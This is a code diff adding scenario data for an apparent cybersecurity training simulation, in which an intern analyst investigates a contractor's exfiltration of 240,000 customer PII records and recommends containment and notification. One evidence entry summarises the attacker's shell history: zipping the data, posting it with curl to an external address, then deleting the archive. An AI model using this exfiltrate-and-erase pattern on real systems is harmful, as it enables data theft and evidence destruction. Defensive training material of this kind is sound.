+          analyst: 'archive_creation.log — customer_data.zip (1.2 GB) built from customer_database.csv at 02:58.',
+          technical: 'archive_creation.log — 02:58 zip of 240,000-row source → customer_data.zip (1.2 GB); exfil staging.',
+          terms: ['archive', 'dataExfiltration'],
+        },
+      },
+      {
+        id: 'ev_transfer', label: 'The archive was uploaded to an external address.',
+        qualityWeight: 3, source: 'transfer.log',
+        layers: {
+          beginner: {
+            summary: 'The archive was uploaded to an outside address and the 1.2 GB transfer finished.',
+            why: 'This is the actual theft — the data physically leaving the company network.',
+            prompt: 'The data has left — when does a risk become a real breach?',
+          },
+          analyst: 'transfer.log — 03:04 UPLOAD customer_data.zip → 198.51.100.23 (external); 1.2 GB COMPLETE at 03:09.',
+          technical: 'transfer.log — HTTPS POST of 1.2 GB archive to external dst 198.51.100.23; transfer COMPLETE.',
+          terms: ['dataExfiltration'],
+        },
+      },
+      {
+        id: 'ev_external_dest', label: 'The destination is an unknown external host in the LATAM region.',
+        qualityWeight: 3, source: 'grep external network_activity.log',
+        layers: {
+          beginner: {
+            summary: 'The upload went to an unknown server outside the company, in the LATAM region.',
+            why: 'Once data reaches an outside server you do not control, it cannot be recalled — the breach is real.',
+            prompt: 'The data is on a stranger'+"'"+'s server now — what does CyberCorp owe the affected customers?',
+          },
+          analyst: 'Egress to 198.51.100.23 (LATAM geo), owner unknown — not a CyberCorp asset or known partner.',
+          technical: 'grep external network_activity.log — dst 198.51.100.23 outside all corp ranges; attacker-controlled host.',
+          terms: ['dataExfiltration', 'dlp'],
+        },
+      },
+      {
+        id: 'ev_endpoint', label: 'The archive was built and uploaded from one workstation (WS-FIN-04).',
+        qualityWeight: 2, source: 'endpoint_activity.log',
+        layers: {
+          beginner: {
+            summary: 'Both the zipping and the upload happened on a single workstation, WS-FIN-04.',
+            why: 'Knowing the exact machine lets the response team isolate it and preserve the evidence.',
+            prompt: 'You have the machine — what should the IR team do with it first?',
+          },
+          analyst: 'endpoint_activity.log — zip + upload processes both on WS-FIN-04; staging host identified.',
+          technical: 'endpoint_activity.log — 02:58 zip, 03:04 upload client, both on WS-FIN-04; isolate + image for forensics.',
+          terms: ['incidentResponse'],
+        },
+      },
+      {
+        id: 'ev_history', label: 'The shell history shows build-upload-delete — a deliberate steal-and-clean.',
+        qualityWeight: 2, source: 'history',
+        layers: {
+          beginner: {
+            summary: 'The commands run show the archive made, uploaded, then deleted to cover tracks.',
+            why: 'Deleting the evidence afterward shows this was deliberate, not an accident.',
+            prompt: 'They tried to delete the file afterward — what does that say about intent?',
+          },
+          analyst: 'Shell history: zip → curl POST to 198.51.100.23 → rm — exfil then anti-forensic cleanup.',
+          technical: 'history — zip -r; curl --data-binary @archive → external; rm archive (evidence destruction attempt).',
+          terms: ['dataExfiltration'],
+        },
+      },
+      {
+        id: 'ev_volume', label: 'The lost data is 1.2 GB of restricted PII for 240,000 people.',
+        qualityWeight: 2, source: 'stat customer_database.csv',
+        layers: {
+          beginner: {
+            summary: 'The stolen file holds names, emails, addresses and payment references for 240,000 customers.',
+            why: 'This is regulated personal data — losing it harms real people and triggers legal duties.',
+            prompt: 'Restricted PII for a quarter-million people is gone — how serious is this?',
+          },
+          analyst: 'customer_database.csv = 1.2 GB / 240,000 rows of RESTRICTED PII (names, emails, addresses, payment refs).',
+          technical: 'stat customer_database.csv — 1.2 GB, 240,000 rows, classification RESTRICTED (regulated PII).',
+          terms: ['pii', 'restricted'],
+        },
+      },
+      {
+        id: 'ev_dlp', label: 'DLP independently classified this as confirmed data exfiltration.',
+        qualityWeight: 2, source: 'system_alerts.log', setFlag: 'dataExfiltrationConfirmed',
+        layers: {
+          beginner: {
+            summary: 'The data-loss-prevention system already labeled this a confirmed data-exfiltration event.',
+            why: 'Independent confirmation that the separate clues add up to one real breach.',
+            prompt: 'The system already confirms exfiltration — are you ready to name the root cause and act?',
+          },
+          analyst: 'DLP CRITICAL alert at 03:05: large outbound transfer of RESTRICTED data → confirmed exfiltration.',
+          technical: 'system_alerts.log — DLP classification: confirmed data exfiltration of restricted PII (large egress).',
+          terms: ['dlp', 'dataExfiltration'],
+        },
+      },
+      {
+        id: 'ev_incident_notes', label: 'The IR runbook requires containing the channel, escalating, and recommending notification.',
+        qualityWeight: 1, source: 'incident_notes.txt',
+        layers: {
+          beginner: {
+            summary: 'The incident-response runbook spells out the required steps for a confirmed PII breach.',
+            why: 'Following the runbook turns a confirmed breach into a complete, defensible response.',
+            prompt: 'With the runbook in hand, what is the full response — not just the first step?',
+          },
+          analyst: 'IR runbook: confirmed PII exfiltration → contain the channel, escalate to IR, recommend customer + regulator notification.',
+          technical: 'incident_notes.txt — IR runbook: contain egress channel, escalate to IR, recommend customer + regulator notification on confirmed PII loss.',
+          terms: ['incidentResponse', 'breachNotification'],
+        },
+      },
+      {
+        id: 'ev_legal', label: 'The loss crosses breach-notification thresholds — regulators must be told.',
+        qualityWeight: 2, source: 'legal_exposure_report.txt',
+        layers: {
+          beginner: {
+            summary: 'Legal confirms the company must notify regulators and customers about this loss.',
+            why: 'For regulated personal data, notification is a legal duty — delay means fines and harm.',
+            prompt: 'Notification is now required by law — how does that change your recommendation?',
+          },
+          analyst: 'Legal: 240,000 PII records exposed → breach-notification thresholds met; penalty risk on delay.',
+          technical: 'legal_exposure_report.txt — regulatory breach-notification thresholds MET; delayed notice → penalties.',
+          terms: ['breachNotification', 'pii'],
+        },
+      },
+      {
+        id: 'ev_manager', label: 'Your SOC Lead confirms the priority and the limits of your authority.',
+        qualityWeight: 1, source: 'manager_briefing.txt',
+        layers: {
+          beginner: {
+            summary: 'Your manager confirms this is top priority and that you recommend — you do not act company-wide.',
+            why: 'Knowing the scope of your authority keeps your recommendation realistic and actionable.',
+            prompt: 'Within an intern'+"'"+'s authority, what is the strongest response you can recommend?',
+          },
+          analyst: 'Manager: top priority; build timeline + root cause; recommend containment/escalation, not unilateral company-wide action.',
+          technical: 'manager_briefing.txt — scope of authority = recommend; company-wide actions routed via SOC Lead / IR.',
+          terms: ['incidentResponse'],
+        },
+      },
+    ],
+
+    actions: [
+      {
+        id: 'recommend_disable_account',
+        type: 'recommendation',
+        label: 'Recommend Account Disablement',
+        summary: 'Recommend disabling the compromised Finance account to cut off the operator.',
+        outcomeSub: 'You recommended disabling the compromised account.',
+        deltas: { securityPosture: 16, complianceExposure: -10, businessContinuity: -5, executiveTrust: 8, careerReputation: 9 },
+        setFlags: ['exfilContained'],
+        deniedNote: 'Leadership held off on disabling the account pending firmer confirmation of compromise.',
+        consequence: {
+          immediate: ['The compromised account is disabled; the operator loses their way back in.'],
+          business: ['Cuts the attacker'+"'"+'s access, though the data already taken is still gone.'],
+          future: ['Fast containment of the access path strengthens your standing on later incidents.'],
+        },
+      },
+      {
+        id: 'recommend_block_device',
+        type: 'recommendation',
+        label: 'Recommend Device Block',
+        summary: 'Recommend isolating the staging workstation and blocking the external destination.',
+        outcomeSub: 'You recommended isolating the endpoint and blocking the destination.',
+        deltas: { securityPosture: 15, complianceExposure: -8, businessContinuity: -4, executiveTrust: 7, careerReputation: 8 },
+        setFlags: ['exfilContained'],
+        deniedNote: 'Leadership wanted the account contained first before isolating hardware.',
+        consequence: {
+          immediate: ['WS-FIN-04 is isolated and the external host is blocked at the firewall.'],
+          business: ['Stops any further upload from that machine; the endpoint is preserved for forensics.'],
+          future: ['Blocking the channel is recorded as decisive containment.'],
+        },
+      },
+      {
+        id: 'recommend_forensics',
+        type: 'recommendation',
+        label: 'Recommend Forensics Review',
+        summary: 'Recommend a forensic image and review of the staging workstation.',
+        outcomeSub: 'You recommended a forensic review of the endpoint.',
+        deltas: { securityPosture: 10, complianceExposure: -6, executiveTrust: 8, careerReputation: 7, businessContinuity: -2 },
+        setFlags: ['incidentResponseEscalated'],
+        deniedNote: 'Leadership wanted containment locked in before committing forensic resources.',
+        consequence: {
+          immediate: ['A forensic image of WS-FIN-04 is taken to preserve the full evidence chain.'],
+          business: ['Forensics establishes exactly what was taken and how — vital for the regulator report.'],
+          future: ['A clean evidence chain protects the company in the investigation that follows.'],
+        },
+      },
+      {
+        id: 'recommend_legal',
+        type: 'recommendation',
+        label: 'Recommend Legal & Regulatory Notification',
+        summary: 'Recommend notifying Legal and the relevant data-protection regulators.',
+        outcomeSub: 'You recommended legal and regulatory notification.',
+        deltas: { complianceExposure: -16, executiveTrust: 9, careerReputation: 7, securityPosture: 3, businessContinuity: -3 },
+        setFlags: ['incidentResponseEscalated'],
+        deniedNote: 'Leadership wanted the full scope confirmed before formally notifying regulators.',
+        consequence: {
+          immediate: ['Legal is engaged and the regulator-notification clock is handled correctly.'],
+          business: ['Meeting the legal duty on time avoids penalties for late disclosure.'],
+          future: ['Handling notification by the book protects the company from compounding fines.'],
+        },
+      },
+      {
+        id: 'recommend_customer_notify',
+        type: 'recommendation',
+        label: 'Recommend Customer Notification',
+        summary: 'Recommend notifying the 240,000 affected customers of the breach.',
+        outcomeSub: 'You recommended notifying affected customers.',
+        deltas: { complianceExposure: -12, executiveTrust: 6, careerReputation: 8, businessContinuity: -5, securityPosture: 2 },
+        setFlags: ['customerNotificationRecommended'],
+        deniedNote: 'Leadership wanted to confirm the affected-record count before notifying customers.',
+        consequence: {
+          immediate: ['Affected customers are told their data was exposed and what to watch for.'],
+          business: ['Short-term reputational cost, but transparency preserves long-term trust and meets the law.'],
+          future: ['Doing right by customers under pressure builds lasting credibility.'],
+        },
+      },
+      {
+        id: 'submit_incident_report',
+        type: 'recommendation',
+        label: 'Submit Incident Report',
+        summary: 'Submit the complete incident report: timeline, root cause, containment, and notification plan.',
+        outcomeSub: 'You submitted the full incident report.',
+        deltas: { securityPosture: 14, complianceExposure: -14, executiveTrust: 12, careerReputation: 12, businessContinuity: -3 },
+        setFlags: ['dataExfiltrationConfirmed', 'incidentResponseEscalated'],
+        deniedNote: 'Leadership sent the report back asking for a clearer containment recommendation.',
+        consequence: {
+          immediate: ['A complete, evidence-backed incident report goes to leadership and IR.'],
+          business: ['The board gets the clear account it asked for: how it happened, what was lost, how it is contained.'],
+          future: ['A thorough capstone report cements your reputation as a trusted analyst.'],
+        },
+      },
+      {
+        id: 'continue_investigation',
+        type: 'direct',
+        label: 'Continue Investigating',
+        summary: 'Hold off on any response and keep gathering information.',
+        outcomeSub: 'You chose to keep investigating before recommending anything.',
+        deltas: { securityPosture: -8, complianceExposure: 12, businessContinuity: 1, careerReputation: -5 },
+        consequence: {
+          immediate: ['No containment yet; the attacker keeps their foothold and the notification clock keeps running.'],
+          business: ['The evidence already confirms a breach — delay only adds regulatory and reputational risk.'],
+          future: ['Hesitating on a confirmed, time-sensitive breach is noted as a costly delay.'],
+        },
+      },
+      {
+        id: 'downgrade',
+        type: 'direct',
+        label: 'Downgrade to Low Priority',
+        summary: 'Treat the alert as low-risk and defer it.',
+        outcomeSub: 'You downgraded the incident.',
+        deltas: { securityPosture: -24, complianceExposure: 30, businessContinuity: 2, careerReputation: -20, executiveTrust: -20 },
+        consequence: {
+          immediate: ['A confirmed exfiltration of 240,000 PII records is left unaddressed.'],
+          business: ['Missing the legal notification window turns a breach into major fines and lasting harm.'],
+          future: ['Downgrading a confirmed critical breach is a severe blow to trust in your judgment.'],
+        },
+      },
+    ],
+
+    lockedActions: [
+      {
+        id: 'companywide_lockdown',
+        label: 'Execute Company-Wide Data Lockdown',
+        reason: 'Cybersecurity Interns cannot lock down company-wide systems. That is an Incident Commander decision.',
+        alternativeRecommendationId: 'rec_companywide_lockdown',
+      },
+      {
+        id: 'terminate_contractor',
+        label: 'Terminate the Contractor'+"'"+'s Contract',
+        reason: 'Interns cannot terminate a vendor contract. Route this through Legal, HR, and your SOC Lead.',
+        alternativeRecommendationId: 'rec_terminate_contractor',
+      },
+    ],
+
+    recommendations: {
+      rec_companywide_lockdown: {
+        label: 'Company-Wide Data Lockdown',
+        deltas: { securityPosture: 12, complianceExposure: -10, businessContinuity: -10, careerReputation: 6 },
+        setFlags: ['exfilContained', 'incidentResponseEscalated'],
+        deniedNote: 'Leadership declined a full lockdown without evidence the breach was spreading.',
+        consequence: {
+          immediate: ['Requested a broad lockdown to halt any further data movement.'],
+          business: ['A lockdown is highly disruptive but guarantees nothing more leaves while IR investigates.'],
+          future: ['A documented, decisive containment call carried into later work.'],
+        },
+      },
+      rec_terminate_contractor: {
+        label: 'Contractor Contract Termination',
+        deltas: { securityPosture: 9, executiveTrust: 7, careerReputation: 8, complianceExposure: -6 },
+        setFlags: ['incidentResponseEscalated'],
+        deniedNote: 'Leadership deferred contract termination to Legal and HR pending the IR findings.',
+        consequence: {
+          immediate: ['Requested termination of the contractor tied to the exfiltration.'],
+          business: ['Removes the recurring actor as a source of further incidents, via the proper channels.'],
+          future: ['Closing out the contractor thread cleanly reduces risk going forward.'],
+        },
+      },
+    },
+
+    /* ------------------------------------------------------------------ *
+     * DYNAMIC CONDITIONS — the headline feature. Each reads carry-flags set
+     * by Assignments 001/002/003 and additively reshapes this case. They are
+     * applied in openCareerMission via career-dynamic.js (pure, non-mutating):
+     * addEvidence/addCommands keep 100% confidence achievable (every added
+     * finding has a command to surface it); continuity shows in the brief;
+     * outcomeNote + deltaMods show in the debrief (deltas are post-hoc, never
+     * altering the leadership verdict).
+     * ------------------------------------------------------------------ */
+    dynamicConditions: [
+      {
+        /* A — BAD carry from Assignment 002: a rogue device left active became
+         * the relay the stolen archive left through. */
+        id: 'dyn_open_channel',
+        when: { allOf: ['rogueDeviceActive'], noneOf: ['rogueDeviceContained'] },
+        continuity: {
+          from: 'ASSIGNMENT 002 · NETWORK EXPOSURE',
+          decision: 'You left the unknown device 192.168.1.57 active on the network.',
+          consequence: 'The stolen archive was relayed out through that same device — the exfiltration rode a door left open.',
+          tone: 'bad',
+        },
+        addCommands: [
+          {
+            id: 'cmd_dyn_rogue_relay',
+            match: ['grep 192.168.1.57 network_activity.log', 'grep 192.168.1.57', 'grep rogue network_activity.log'],
+            help: 'trace the transfer through the un-removed device',
+            output: [
+              { t: 'grep 192.168.1.57 network_activity.log', c: 'head' },
+              '  03:04  relay  customer_data.zip via 192.168.1.57 -> 198.51.100.23',
+              '  # 192.168.1.57 = the rogue device left active in Assignment 002',
+            ],
+            reveals: ['ev_dyn_rogue_relay'],
+            observation: 'The archive was relayed through 192.168.1.57 — the rogue device you left active in your earlier network case.',
+            question: 'Had that device been removed back then, would this upload have had a path out at all?',
+            next: 'finish the timeline and type  decide',
+          },
+        ],
+        addEvidence: [
+          {
+            id: 'ev_dyn_rogue_relay', label: 'The archive was relayed out through the rogue device from Assignment 002.',
+            qualityWeight: 1, source: 'grep 192.168.1.57 network_activity.log',
+            layers: {
+              beginner: {
+                summary: 'The stolen data left through 192.168.1.57 — the unknown device you left active in the network case.',
+                why: 'A device left on the network became the exact path the attacker used to ship the data out.',
+                prompt: 'How much of this breach traces back to a door left open earlier?',
+              },
+              analyst: 'Egress relayed via 192.168.1.57 (rogue device, never contained in A002) → 198.51.100.23.',
+              technical: 'network_activity.log — exfil hop through 192.168.1.57 (uncontained rogue host) to external dst.',
+              terms: ['dataExfiltration', 'network'],
+            },
+          },
+        ],
+        addRisks: [
+          { id: 'risk_dyn_open_channel', label: 'The archive left through a device left active in a prior case', triggeredBy: ['ev_dyn_rogue_relay'] },
+        ],
+        deltaMods: { complianceExposure: 10, businessContinuity: -6 },
+        tone: 'bad',
+        outcomeNote: 'Because the rogue device from Assignment 002 was never removed, the exfiltration used it as a relay — compliance exposure rose and recovery is slower. Containing that device earlier would have closed this path.',
+      },
+      {
+        /* B — GOOD continuity payoff: any earlier link to the recurring
+         * contractor makes attribution fast and high-confidence. */
+        id: 'dyn_attribution',
+        when: { anyOf: ['contractorAccountCompromised', 'contractorDeviceLinked', 'contractorAccessDiscovered'] },
+        continuity: {
+          from: 'PRIOR CASES · RECURRING ACTOR',
+          decision: 'You linked the recurring contractor (J. Demir / ext-contractor-07) in an earlier case.',
+          consequence: 'Threat intel maps this exfil session to that same identity — attribution is immediate, not guesswork.',
+          tone: 'good',
+        },
+        addCommands: [
+          {
+            id: 'cmd_dyn_attribution',
+            match: ['grep contractor threat_intel.log', 'cat threat_intel.log', 'grep contractor threat_intel'],
+            help: 'cross-reference the session against prior-case intel',
+            output: [
+              { t: 'grep contractor threat_intel.log', c: 'head' },
+              '  match: exfil session src == ext-contractor-07 (J. Demir)',
+              '  linked to your prior cases — HIGH-confidence attribution',
+            ],
+            reveals: ['ev_dyn_attribution'],
+            observation: 'Threat intel from your earlier cases maps this exfil session straight to ext-contractor-07 — attribution is immediate.',
+            question: 'With the actor already known, what can the response do faster than starting from scratch?',
+            next: 'finish the timeline and type  decide',
+          },
+        ],
+        addEvidence: [
+          {
+            id: 'ev_dyn_attribution', label: 'Prior-case intel attributes the exfil to ext-contractor-07 (J. Demir).',
+            qualityWeight: 1, source: 'grep contractor threat_intel.log',
+            layers: {
+              beginner: {
+                summary: 'Intel from your earlier cases ties this theft to the same contractor, J. Demir.',
+                why: 'Knowing exactly who did it lets the response move faster and more confidently.',
+                prompt: 'How much time does already knowing the attacker save the response team?',
+              },
+              analyst: 'Threat-intel correlation: exfil session ↔ ext-contractor-07 (J. Demir), built from prior-case links.',
+              technical: 'threat_intel.log — high-confidence attribution to ext-contractor-07 via prior-case identity graph.',
+              terms: ['incidentResponse', 'rootCause'],
+            },
+          },
+        ],
+        addRisks: [
+          { id: 'risk_dyn_attribution', label: 'The exfil identity matches the actor flagged in your prior cases', triggeredBy: ['ev_dyn_attribution'] },
+        ],
+        deltaMods: { executiveTrust: 4, careerReputation: 4 },
+        tone: 'good',
+        outcomeNote: 'Your earlier work tying the recurring contractor to this actor let you attribute the exfiltration with confidence — leadership credited the connected investigation.',
+      },
+      {
+        /* C — GOOD carry from Assignment 003: enforced MFA limited the
+         * compromised account, shrinking how much data could leave. */
+        id: 'dyn_mfa_scope',
+        when: { allOf: ['mfaRecommended'] },
+        continuity: {
+          from: 'ASSIGNMENT 003 · AUTH SECURITY',
+          decision: 'You recommended enforcing MFA on the compromised account.',
+          consequence: 'MFA challenged the session mid-transfer, so a smaller archive left — the enforced control shrank the breach.',
+          tone: 'good',
+        },
+        addCommands: [
+          {
+            id: 'cmd_dyn_mfa_scope',
+            match: ['grep mfa system_alerts.log', 'grep mfa', 'grep mfa system_alerts'],
+            help: 'check how MFA enforcement limited the session',
+            output: [
+              { t: 'grep mfa system_alerts.log', c: 'head' },
+              '  03:06  MFA challenge interrupted the session mid-transfer',
+              '  partial archive only — fewer records reached the external host',
+            ],
+            reveals: ['ev_dyn_mfa_scope'],
+            observation: 'The MFA enforcement you recommended earlier challenged the session mid-transfer, cutting the exfil short.',
+            question: 'How much worse would this breach be if that control had not been in place?',
+            next: 'finish the timeline and type  decide',
+          },
+        ],
+        addEvidence: [
+          {
+            id: 'ev_dyn_mfa_scope', label: 'Enforced MFA cut the session short — a smaller archive left.',
+            qualityWeight: 1, source: 'grep mfa system_alerts.log',
+            layers: {
+              beginner: {
+                summary: 'Because MFA was enforced earlier, the attacker'+"'"+'s session was challenged and fewer records got out.',
+                why: 'A control you put in place in a past case directly reduced the size of this breach.',
+                prompt: 'How much did the earlier MFA decision shrink the damage here?',
+              },
+              analyst: 'MFA challenge interrupted the exfil session — partial transfer; reduced exfil volume vs un-enforced baseline.',
+              technical: 'system_alerts.log — MFA step-up mid-session truncated egress; smaller archive reached external dst.',
+              terms: ['mfa', 'dataExfiltration'],
+            },
+          },
+        ],
+        deltaMods: { complianceExposure: -8, securityPosture: 4 },
+        tone: 'good',
+        outcomeNote: 'Enforcing MFA in Assignment 003 cut the attacker'+"'"+'s window short — fewer records were exfiltrated and compliance exposure is lower than it would have been.',
+      },
+      {
+        /* D — BAD carry from Assignment 001: prior sensitive-data exposure /
+         * legal review makes this a repeat incident with higher stakes. */
+        id: 'dyn_repeat_exposure',
+        when: { anyOf: ['sensitiveDataExposed', 'legalReviewTriggered'] },
+        continuity: {
+          from: 'ASSIGNMENT 001 · DATA PROTECTION',
+          decision: 'A prior case already flagged sensitive-data exposure or triggered legal review.',
+          consequence: 'This is a repeat exposure for the same organization — regulators and legal treat it far more seriously.',
+          tone: 'bad',
+        },
+        deltaMods: { complianceExposure: 6, executiveTrust: -2 },
+        tone: 'bad',
+        outcomeNote: 'Because sensitive data was already exposed in an earlier case, this counts as a repeat incident — regulatory and legal stakes are higher, strengthening the case for prompt customer notification.',
+      },
+    ],
   },
 };
 
